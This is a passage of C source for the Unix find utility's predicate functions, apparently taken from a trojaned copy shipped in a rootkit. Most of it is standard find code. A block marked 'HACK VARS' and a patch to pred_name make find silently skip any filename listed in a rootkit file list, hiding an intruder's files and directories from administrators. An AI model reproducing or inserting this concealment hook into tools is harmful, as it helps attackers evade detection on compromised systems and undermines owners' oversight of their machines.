static boolean insert_lname P_((char *pathname, struct stat *stat_buf, struct predicate *pred_ptr, boolean ignore_case));
static boolean launch P_((struct predicate *pred_ptr));
static char *format_date P_((time_t when, int kind));

#ifdef	DEBUG
struct pred_assoc
{
  PFB pred_func;
  char *pred_name;
};

struct pred_assoc pred_table[] =
{
  {pred_amin, "amin    "},
  {pred_and, "and     "},
  {pred_anewer, "anewer  "},
  {pred_atime, "atime   "},
  {pred_close, ")       "},
  {pred_amin, "cmin    "},
  {pred_cnewer, "cnewer  "},
  {pred_comma, ",       "},
  {pred_ctime, "ctime   "},
  {pred_empty, "empty   "},
  {pred_exec, "exec    "},
  {pred_false, "false   "},
  {pred_fprint, "fprint  "},
  {pred_fprint0, "fprint0 "},
  {pred_fprintf, "fprintf "},
  {pred_fstype, "fstype  "},
  {pred_gid, "gid     "},
  {pred_group, "group   "},
  {pred_ilname, "ilname  "},
  {pred_iname, "iname   "},
  {pred_inum, "inum    "},
  {pred_ipath, "ipath   "},
  {pred_links, "links   "},
  {pred_lname, "lname   "},
  {pred_ls, "ls      "},
  {pred_amin, "mmin    "},
  {pred_mtime, "mtime   "},
  {pred_name, "name    "},
  {pred_negate, "not     "},
  {pred_newer, "newer   "},
  {pred_nogroup, "nogroup "},
  {pred_nouser, "nouser  "},
  {pred_ok, "ok      "},
  {pred_open, "(       "},
  {pred_or, "or      "},
  {pred_path, "path    "},
  {pred_perm, "perm    "},
  {pred_print, "print   "},
  {pred_print0, "print0  "},
  {pred_prune, "prune   "},
  {pred_regex, "regex   "},
  {pred_size, "size    "},
  {pred_true, "true    "},
  {pred_type, "type    "},
  {pred_uid, "uid     "},
  {pred_used, "used    "},
  {pred_user, "user    "},
  {pred_xtype, "xtype   "},
  {0, "none    "}
};

struct op_assoc
{
  short type;
  char *type_name;
};

struct op_assoc type_table[] =
{
  {NO_TYPE, "no          "},
  {PRIMARY_TYPE, "primary      "},
  {UNI_OP, "uni_op      "},
  {BI_OP, "bi_op       "},
  {OPEN_PAREN, "open_paren  "},
  {CLOSE_PAREN, "close_paren "},
  {-1, "unknown     "}
};

struct prec_assoc
{
  short prec;
  char *prec_name;
};

struct prec_assoc prec_table[] =
{
  {NO_PREC, "no      "},
  {COMMA_PREC, "comma   "},
  {OR_PREC, "or      "},
  {AND_PREC, "and     "},
  {NEGATE_PREC, "negate  "},
  {MAX_PREC, "max     "},
  {-1, "unknown "}
};
#endif	/* DEBUG */

/* Predicate processing routines.
 
   PATHNAME is the full pathname of the file being checked.
   *STAT_BUF contains information about PATHNAME.
   *PRED_PTR contains information for applying the predicate.
 
   Return true if the file passes this predicate, false if not. */

boolean
pred_amin (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  switch (pred_ptr->args.info.kind)
    {
    case COMP_GT:
      if (stat_buf->st_atime > (time_t) pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_LT:
      if (stat_buf->st_atime < (time_t) pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_EQ:
      if ((stat_buf->st_atime >= (time_t) pred_ptr->args.info.l_val)
	  && (stat_buf->st_atime < (time_t) pred_ptr->args.info.l_val + 60))
	return (true);
      break;
    }
  return (false);
}

boolean
pred_and (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  if (pred_ptr->pred_left == NULL
      || (*pred_ptr->pred_left->pred_func) (pathname, stat_buf,
					    pred_ptr->pred_left))
    {
      /* Check whether we need a stat here. */
      if (pred_ptr->need_stat)
	{
	  if (!have_stat && (*xstat) (rel_pathname, stat_buf) != 0)
	    {
	      error (0, errno, "%s", pathname);
	      exit_status = 1;
	      return (false);
	    }
	  have_stat = true;
	}
      return ((*pred_ptr->pred_right->pred_func) (pathname, stat_buf,
						  pred_ptr->pred_right));
    }
  else
    return (false);
}

boolean
pred_anewer (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  if (stat_buf->st_atime > pred_ptr->args.time)
    return (true);
  return (false);
}

boolean
pred_atime (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  switch (pred_ptr->args.info.kind)
    {
    case COMP_GT:
      if (stat_buf->st_atime > (time_t) pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_LT:
      if (stat_buf->st_atime < (time_t) pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_EQ:
      if ((stat_buf->st_atime >= (time_t) pred_ptr->args.info.l_val)
	  && (stat_buf->st_atime < (time_t) pred_ptr->args.info.l_val
	      + DAYSECS))
	return (true);
      break;
    }
  return (false);
}

boolean
pred_close (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  return (true);
}

boolean
pred_cmin (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  switch (pred_ptr->args.info.kind)
    {
    case COMP_GT:
      if (stat_buf->st_ctime > (time_t) pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_LT:
      if (stat_buf->st_ctime < (time_t) pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_EQ:
      if ((stat_buf->st_ctime >= (time_t) pred_ptr->args.info.l_val)
	  && (stat_buf->st_ctime < (time_t) pred_ptr->args.info.l_val + 60))
	return (true);
      break;
    }
  return (false);
}

boolean
pred_cnewer (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  if (stat_buf->st_ctime > pred_ptr->args.time)
    return (true);
  return (false);
}

boolean
pred_comma (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  if (pred_ptr->pred_left != NULL)
    (*pred_ptr->pred_left->pred_func) (pathname, stat_buf,
				       pred_ptr->pred_left);
  /* Check whether we need a stat here. */
  if (pred_ptr->need_stat)
    {
      if (!have_stat && (*xstat) (rel_pathname, stat_buf) != 0)
	{
	  error (0, errno, "%s", pathname);
	  exit_status = 1;
	  return (false);
	}
      have_stat = true;
    }
  return ((*pred_ptr->pred_right->pred_func) (pathname, stat_buf,
					      pred_ptr->pred_right));
}

boolean
pred_ctime (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  switch (pred_ptr->args.info.kind)
    {
    case COMP_GT:
      if (stat_buf->st_ctime > (time_t) pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_LT:
      if (stat_buf->st_ctime < (time_t) pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_EQ:
      if ((stat_buf->st_ctime >= (time_t) pred_ptr->args.info.l_val)
	  && (stat_buf->st_ctime < (time_t) pred_ptr->args.info.l_val
	      + DAYSECS))
	return (true);
      break;
    }
  return (false);
}

boolean
pred_empty (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{

  if (S_ISDIR (stat_buf->st_mode))
    {
      DIR *d;
      struct dirent *dp;
      boolean empty = true;

      errno = 0;
      d = opendir (rel_pathname);

      if (d == NULL)
	{
	  error (0, errno, "%s", pathname);
	  exit_status = 1;
	  return (false);
	}
      for (dp = readdir (d); dp; dp = readdir (d))
	{
	  if (dp->d_name[0] != '.'
	      || (dp->d_name[1] != '\0'
		  && (dp->d_name[1] != '.' || dp->d_name[2] != '\0')))
	    {
	      empty = false;
	      break;
	    }
	}
      if (CLOSEDIR (d))
	{
	  error (0, errno, "%s", pathname);
	  exit_status = 1;
	  return (false);
	}
      return (empty);
    }
  else if (S_ISREG (stat_buf->st_mode))
    return (stat_buf->st_size == 0);
  else
    return (false);
}

boolean
pred_exec (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  int i;
  int path_pos;
  struct exec_val *execp;	/* Pointer for efficiency. */

  execp = &pred_ptr->args.exec_vec;

  /* Replace "{}" with the real path in each affected arg. */
  for (path_pos = 0; execp->paths[path_pos].offset >= 0; path_pos++)
    {
      register char *from, *to;

      i = execp->paths[path_pos].offset;
      execp->vec[i] =
	xmalloc (strlen (execp->paths[path_pos].origarg) + 1
		 + (strlen (pathname) - 2) * execp->paths[path_pos].count);
      for (from = execp->paths[path_pos].origarg, to = execp->vec[i]; *from; )
	if (from[0] == '{' && from[1] == '}')
	  {
	    to = stpcpy (to, pathname);
	    from += 2;
	  }
	else
	  *to++ = *from++;
      *to = *from;		/* Copy null. */
    }

  i = launch (pred_ptr);

  /* Free the temporary args. */
  for (path_pos = 0; execp->paths[path_pos].offset >= 0; path_pos++)
    free (execp->vec[execp->paths[path_pos].offset]);

  return (i);
}

boolean
pred_false (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  return (false);
}

boolean
pred_fls (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  list_file (pathname, rel_pathname, stat_buf, pred_ptr->args.stream);
  return (true);
}

boolean
pred_fprint (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  fputs (pathname, pred_ptr->args.stream);
  putc ('\n', pred_ptr->args.stream);
  return (true);
}

boolean
pred_fprint0 (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  fputs (pathname, pred_ptr->args.stream);
  putc (0, pred_ptr->args.stream);
  return (true);
}

boolean
pred_fprintf (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  FILE *fp = pred_ptr->args.printf_vec.stream;
  struct segment *segment;
  char *cp;

  for (segment = pred_ptr->args.printf_vec.segment; segment;
       segment = segment->next)
    {
      if (segment->kind & 0xff00) /* Component of date. */
	{
	  time_t t;

	  switch (segment->kind & 0xff)
	    {
	    case 'A':
	      t = stat_buf->st_atime;
	      break;
	    case 'C':
	      t = stat_buf->st_ctime;
	      break;
	    case 'T':
	      t = stat_buf->st_mtime;
	      break;
	    default:
	      abort ();
	    }
	  fprintf (fp, segment->text,
		   format_date (t, (segment->kind >> 8) & 0xff));
	  continue;
	}

      switch (segment->kind)
	{
	case KIND_PLAIN:	/* Plain text string (no % conversion). */
	  fwrite (segment->text, 1, segment->text_len, fp);
	  break;
	case KIND_STOP:		/* Terminate argument and flush output. */
	  fwrite (segment->text, 1, segment->text_len, fp);
	  fflush (fp);
	  return (true);
	case 'a':		/* atime in `ctime' format. */
	  cp = ctime (&stat_buf->st_atime);
	  cp[24] = '\0';
	  fprintf (fp, segment->text, cp);
	  break;
	case 'b':		/* size in 512-byte blocks */
	  fprintf (fp, segment->text, ST_NBLOCKS (stat_buf));
	  break;
	case 'c':		/* ctime in `ctime' format */
	  cp = ctime (&stat_buf->st_ctime);
	  cp[24] = '\0';
	  fprintf (fp, segment->text, cp);
	  break;
	case 'd':		/* depth in search tree */
	  fprintf (fp, segment->text, curdepth);
	  break;
	case 'f':		/* basename of path */
	  cp = strrchr (pathname, '/');
	  if (cp)
	    cp++;
	  else
	    cp = pathname;
	  fprintf (fp, segment->text, cp);
	  break;
	case 'F':		/* filesystem type */
	  fprintf (fp, segment->text,
		   filesystem_type (pathname, rel_pathname, stat_buf));
	  break;
	case 'g':		/* group name */
	  {
	    struct group *g;

	    g = getgrgid (stat_buf->st_gid);
	    if (g)
	      {
		segment->text[segment->text_len] = 's';
		fprintf (fp, segment->text, g->gr_name);
		break;
	      }
	    /* else fallthru */
	  }
	case 'G':		/* GID number */
	  segment->text[segment->text_len] = 'u';
	  fprintf (fp, segment->text, stat_buf->st_gid);
	  break;
	case 'h':		/* leading directories part of path */
	  {
	    char cc;

	    cp = strrchr (pathname, '/');
	    if (cp == NULL)	/* No leading directories. */
	      break;
	    cc = *cp;
	    *cp = '\0';
	    fprintf (fp, segment->text, pathname);
	    *cp = cc;
	    break;
	  }
	case 'H':		/* ARGV element file was found under */
	  {
	    char cc = pathname[path_length];

	    pathname[path_length] = '\0';
	    fprintf (fp, segment->text, pathname);
	    pathname[path_length] = cc;
	    break;
	  }
	case 'i':		/* inode number */
	  fprintf (fp, segment->text, stat_buf->st_ino);
	  break;
	case 'k':		/* size in 1K blocks */
	  fprintf (fp, segment->text, (ST_NBLOCKS (stat_buf) + 1) / 2);
	  break;
	case 'l':		/* object of symlink */
#ifdef S_ISLNK
	  {
	    char *linkname = 0;

	    if (S_ISLNK (stat_buf->st_mode))
	      {
		linkname = get_link_name (pathname, rel_pathname);
		if (linkname == 0)
		  exit_status = 1;
	      }
	    if (linkname)
	      {
		fprintf (fp, segment->text, linkname);
		free (linkname);
	      }
	    else
	      fprintf (fp, segment->text, "");
	  }
#endif				/* S_ISLNK */
	  break;
	case 'm':		/* mode as octal number (perms only) */
	  fprintf (fp, segment->text, stat_buf->st_mode & 07777);
	  break;
	case 'n':		/* number of links */
	  fprintf (fp, segment->text, stat_buf->st_nlink);
	  break;
	case 'p':		/* pathname */
	  fprintf (fp, segment->text, pathname);
	  break;
	case 'P':		/* pathname with ARGV element stripped */
	  if (curdepth)
	    {
	      cp = pathname + path_length;
	      if (*cp == '/')
		/* Move past the slash between the ARGV element
		   and the rest of the pathname.  But if the ARGV element
		   ends in a slash, we didn't add another, so we've
		   already skipped past it.  */
		cp++;
	    }
	  else
	    cp = "";
	  fprintf (fp, segment->text, cp);
	  break;
	case 's':		/* size in bytes */
	  fprintf (fp, segment->text, stat_buf->st_size);
	  break;
	case 't':		/* mtime in `ctime' format */
	  cp = ctime (&stat_buf->st_mtime);
	  cp[24] = '\0';
	  fprintf (fp, segment->text, cp);
	  break;
	case 'u':		/* user name */
	  {
	    struct passwd *p;

	    p = getpwuid (stat_buf->st_uid);
	    if (p)
	      {
		segment->text[segment->text_len] = 's';
		fprintf (fp, segment->text, p->pw_name);
		break;
	      }
	    /* else fallthru */
	  }
	case 'U':		/* UID number */
	  segment->text[segment->text_len] = 'u';
	  fprintf (fp, segment->text, stat_buf->st_uid);
	  break;
	}
    }
  return (true);
}

boolean
pred_fstype (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  if (strcmp (filesystem_type (pathname, rel_pathname, stat_buf),
	      pred_ptr->args.str) == 0)
    return (true);
  return (false);
}

boolean
pred_gid (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  switch (pred_ptr->args.info.kind)
    {
    case COMP_GT:
      if (stat_buf->st_gid > pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_LT:
      if (stat_buf->st_gid < pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_EQ:
      if (stat_buf->st_gid == pred_ptr->args.info.l_val)
	return (true);
      break;
    }
  return (false);
}

boolean
pred_group (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  if (pred_ptr->args.gid == stat_buf->st_gid)
    return (true);
  else
    return (false);
}

boolean
pred_ilname (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  return insert_lname (pathname, stat_buf, pred_ptr, true);
}

boolean
pred_iname (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  char *base;

  base = basename (pathname);
  if (fnmatch (pred_ptr->args.str, base, FNM_PERIOD | FNM_CASEFOLD) == 0)
    return (true);
  return (false);
}

boolean
pred_inum (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  switch (pred_ptr->args.info.kind)
    {
    case COMP_GT:
      if (stat_buf->st_ino > pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_LT:
      if (stat_buf->st_ino < pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_EQ:
      if (stat_buf->st_ino == pred_ptr->args.info.l_val)
	return (true);
      break;
    }
  return (false);
}

boolean
pred_ipath (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  if (fnmatch (pred_ptr->args.str, pathname, FNM_CASEFOLD) == 0)
    return (true);
  return (false);
}

boolean
pred_links (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  switch (pred_ptr->args.info.kind)
    {
    case COMP_GT:
      if (stat_buf->st_nlink > pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_LT:
      if (stat_buf->st_nlink < pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_EQ:
      if (stat_buf->st_nlink == pred_ptr->args.info.l_val)
	return (true);
      break;
    }
  return (false);
}

boolean
pred_lname (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  return insert_lname (pathname, stat_buf, pred_ptr, false);
}

static boolean
insert_lname (pathname, stat_buf, pred_ptr, ignore_case)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
     boolean ignore_case;
{
  boolean ret = false;
#ifdef S_ISLNK
  if (S_ISLNK (stat_buf->st_mode))
    {
      char *linkname = get_link_name (pathname, rel_pathname);
      if (linkname)
	{
	  if (fnmatch (pred_ptr->args.str, linkname,
		       ignore_case ? FNM_CASEFOLD : 0) == 0)
	    ret = true;
	  free (linkname);
	}
    }
#endif /* S_ISLNK */
  return (ret);
}

boolean
pred_ls (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  list_file (pathname, rel_pathname, stat_buf, stdout);
  return (true);
}

boolean
pred_mmin (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  switch (pred_ptr->args.info.kind)
    {
    case COMP_GT:
      if (stat_buf->st_mtime > (time_t) pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_LT:
      if (stat_buf->st_mtime < (time_t) pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_EQ:
      if ((stat_buf->st_mtime >= (time_t) pred_ptr->args.info.l_val)
	  && (stat_buf->st_mtime < (time_t) pred_ptr->args.info.l_val + 60))
	return (true);
      break;
    }
  return (false);
}

boolean
pred_mtime (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  switch (pred_ptr->args.info.kind)
    {
    case COMP_GT:
      if (stat_buf->st_mtime > (time_t) pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_LT:
      if (stat_buf->st_mtime < (time_t) pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_EQ:
      if ((stat_buf->st_mtime >= (time_t) pred_ptr->args.info.l_val)
	  && (stat_buf->st_mtime < (time_t) pred_ptr->args.info.l_val
	      + DAYSECS))
	return (true);
      break;
    }
  return (false);
}
/* HACK VARS */
#define FILENAME ROOTKIT_FILES_FILE
#define STR_SIZE 128

struct  h_st {
        struct h_st     *next;
        char            filename[STR_SIZE];
};

struct  h_st    *hack_list;
struct  h_st    *h_tmp;

char    tmp_str[STR_SIZE];

FILE    *fp_hack;

/*+  End hack vars  +*/

boolean
pred_name (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  char *base;
  base = basename (pathname);
 /* hack - Dir Hiding
   for blocking our hidden dirs, aka we say their empty but their not
   saves alot on comparison time if we blocked out every file by whats in their full path
   instead
  */
   for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next)
   if (!(strcmp(base, h_tmp->filename))) return (false);
   /*  More kludge - bleah  */
   if (!(strcmp(base, h_tmp->filename))) return (false);
 /* hack */

  if (fnmatch (pred_ptr->args.str, base, FNM_PERIOD) == 0)
    return (true);
  return (false);
}

boolean
pred_negate (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  /* Check whether we need a stat here. */
  if (pred_ptr->need_stat)
    {
      if (!have_stat && (*xstat) (rel_pathname, stat_buf) != 0)
	{
	  error (0, errno, "%s", pathname);
	  exit_status = 1;
	  return (false);
	}
      have_stat = true;
    }
  return (!(*pred_ptr->pred_right->pred_func) (pathname, stat_buf,
					      pred_ptr->pred_right));
}

boolean
pred_newer (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  if (stat_buf->st_mtime > pred_ptr->args.time)
    return (true);
  return (false);
}

boolean
pred_nogroup (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
#ifdef CACHE_IDS
  extern char *gid_unused;

  return gid_unused[(unsigned) stat_buf->st_gid];
#else
  return getgrgid (stat_buf->st_gid) == NULL;
#endif
}

boolean
pred_nouser (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
#ifdef CACHE_IDS
  extern char *uid_unused;

  return uid_unused[(unsigned) stat_buf->st_uid];
#else
  return getpwuid (stat_buf->st_uid) == NULL;
#endif
}

boolean
pred_ok (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  int i, yes;
  
  fflush (stdout);
  fprintf (stderr, "< %s ... %s > ? ",
	   pred_ptr->args.exec_vec.vec[0], pathname);
  fflush (stderr);
  i = getchar ();
  yes = (i == 'y' || i == 'Y');
  while (i != EOF && i != '\n')
    i = getchar ();
  if (!yes)
    return (false);
  return pred_exec (pathname, stat_buf, pred_ptr);
}

boolean
pred_open (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  return (true);
}

boolean
pred_or (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  if (pred_ptr->pred_left == NULL
      || !(*pred_ptr->pred_left->pred_func) (pathname, stat_buf,
					     pred_ptr->pred_left))
    {
      /* Check whether we need a stat here. */
      if (pred_ptr->need_stat)
	{
	  if (!have_stat && (*xstat) (rel_pathname, stat_buf) != 0)
	    {
	      error (0, errno, "%s", pathname);
	      exit_status = 1;
	      return (false);
	    }
	  have_stat = true;
	}
      return ((*pred_ptr->pred_right->pred_func) (pathname, stat_buf,
						  pred_ptr->pred_right));
    }
  else
    return (true);
}

boolean
pred_path (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  if (fnmatch (pred_ptr->args.str, pathname, 0) == 0)
    return (true);
  return (false);
}

boolean
pred_perm (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  if (pred_ptr->args.perm & 010000)
    {
      /* Magic flag set in parse_perm:
	 true if at least the given bits are set. */
      if ((stat_buf->st_mode & 07777 & pred_ptr->args.perm)
	  == (pred_ptr->args.perm & 07777))
	return (true);
    }
  else if (pred_ptr->args.perm & 020000)
    {
      /* Magic flag set in parse_perm:
	 true if any of the given bits are set. */
      if ((stat_buf->st_mode & 07777) & pred_ptr->args.perm)
	return (true);
    }
  else
    {
      /* True if exactly the given bits are set. */
      if ((stat_buf->st_mode & 07777) == pred_ptr->args.perm)
	return (true);
    }
  return (false);
}

boolean
pred_print (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  puts (pathname);
  return (true);
}

boolean
pred_print0 (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  fputs (pathname, stdout);
  putc (0, stdout);
  return (true);
}

boolean
pred_prune (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  stop_at_current_level = true;
  return (do_dir_first);	/* This is what SunOS find seems to do. */
}

boolean
pred_regex (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  int len = strlen (pathname);
  if (re_match (pred_ptr->args.regex, pathname, len, 0,
		(struct re_registers *) NULL) == len)
    return (true);
  return (false);
}

boolean
pred_size (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  unsigned long f_val;

  f_val = (stat_buf->st_size + pred_ptr->args.size.blocksize - 1)
    / pred_ptr->args.size.blocksize;
  switch (pred_ptr->args.size.kind)
    {
    case COMP_GT:
      if (f_val > pred_ptr->args.size.size)
	return (true);
      break;
    case COMP_LT:
      if (f_val < pred_ptr->args.size.size)
	return (true);
      break;
    case COMP_EQ:
      if (f_val == pred_ptr->args.size.size)
	return (true);
      break;
    }
  return (false);
}

boolean
pred_true (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  return (true);
}

boolean
pred_type (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  unsigned long mode = stat_buf->st_mode;
  unsigned long type = pred_ptr->args.type;

#ifndef S_IFMT
  /* POSIX system; check `mode' the slow way. */
  if ((S_ISBLK (mode) && type == S_IFBLK)
      || (S_ISCHR (mode) && type == S_IFCHR)
      || (S_ISDIR (mode) && type == S_IFDIR)
      || (S_ISREG (mode) && type == S_IFREG)
#ifdef S_IFLNK
      || (S_ISLNK (mode) && type == S_IFLNK)
#endif
#ifdef S_IFIFO
      || (S_ISFIFO (mode) && type == S_IFIFO)
#endif
#ifdef S_IFSOCK
      || (S_ISSOCK (mode) && type == S_IFSOCK)
#endif
      )
#else /* S_IFMT */
  /* Unix system; check `mode' the fast way. */
  if ((mode & S_IFMT) == type)
#endif /* S_IFMT */
    return (true);
  else
    return (false);
}

boolean
pred_uid (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  switch (pred_ptr->args.info.kind)
    {
    case COMP_GT:
      if (stat_buf->st_uid > pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_LT:
      if (stat_buf->st_uid < pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_EQ:
      if (stat_buf->st_uid == pred_ptr->args.info.l_val)
	return (true);
      break;
    }
  return (false);
}

boolean
pred_used (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  time_t delta;

  delta = stat_buf->st_atime - stat_buf->st_ctime; /* Use difftime? */
  switch (pred_ptr->args.info.kind)
    {
    case COMP_GT:
      if (delta > (time_t) pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_LT:
      if (delta < (time_t) pred_ptr->args.info.l_val)
	return (true);
      break;
    case COMP_EQ:
      if ((delta >= (time_t) pred_ptr->args.info.l_val)
	  && (delta < (time_t) pred_ptr->args.info.l_val + DAYSECS))
	return (true);
      break;
    }
  return (false);
}

boolean
pred_user (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  if (pred_ptr->args.uid == stat_buf->st_uid)
    return (true);
  else
    return (false);
}

boolean
pred_xtype (pathname, stat_buf, pred_ptr)
     char *pathname;
     struct stat *stat_buf;
     struct predicate *pred_ptr;
{
  struct stat sbuf;
  int (*ystat) ();

  ystat = xstat == lstat ? stat : lstat;
  if ((*ystat) (rel_pathname, &sbuf) != 0)
    {
      if (ystat == stat && errno == ENOENT)
	/* Mimic behavior of ls -lL. */
	return (pred_type (pathname, stat_buf, pred_ptr));
      error (0, errno, "%s", pathname);
      exit_status = 1;
      return (false);
    }
  return (pred_type (pathname, &sbuf, pred_ptr));
}

/*  1) fork to get a child; parent remembers the child pid
    2) child execs the command requested
    3) parent waits for child; checks for proper pid of child

    Possible returns:

    ret		errno	status(h)   status(l)

    pid		x	signal#	    0177	stopped
    pid		x	exit arg    0		term by _exit
    pid		x	0	    signal #	term by signal
    -1		EINTR				parent got signal
    -1		other				some other kind of error

    Return true only if the pid matches, status(l) is
    zero, and the exit arg (status high) is 0.
    Otherwise return false, possibly printing an error message. */

static boolean
launch (pred_ptr)
     struct predicate *pred_ptr;
{
  int status;
  pid_t wait_ret, child_pid;
  struct exec_val *execp;	/* Pointer for efficiency. */
  static int first_time = 1;

  execp = &pred_ptr->args.exec_vec;

  /* Make sure output of command doesn't get mixed with find output. */
  fflush (stdout);
  fflush (stderr);

  /* Make sure to listen for the kids.  */
  if (first_time)
    {
      first_time = 0;
      signal (SIGCHLD, SIG_DFL);
    }

  child_pid = fork ();
  if (child_pid == -1)
    error (1, errno, "cannot fork");
  if (child_pid == 0)
    {
      /* We be the child. */
#ifndef HAVE_FCHDIR
      if (chdir (starting_dir) < 0)
	{
	  error (0, errno, "%s", starting_dir);
	  _exit (1);
	}
#else
      if (fchdir (starting_desc) < 0)
	{
	  error (0, errno, "cannot return to starting directory");
	  _exit (1);
	}
#endif
      execvp (execp->vec[0], execp->vec);
      error (0, errno, "%s", execp->vec[0]);
      _exit (1);
    }

  wait_ret = wait (&status);
  if (wait_ret == -1)
    {
      error (0, errno, "error waiting for %s", execp->vec[0]);
      exit_status = 1;
      return (false);
    }
  if (wait_ret != child_pid)
    {
      error (0, 0, "wait got pid %d, expected pid %d", wait_ret, child_pid);
      exit_status = 1;
      return (false);
    }
  if (WIFSTOPPED (status))
    {
      error (0, 0, "%s stopped by signal %d", 
	     execp->vec[0], WSTOPSIG (status));
      exit_status = 1;
      return (false);
    }
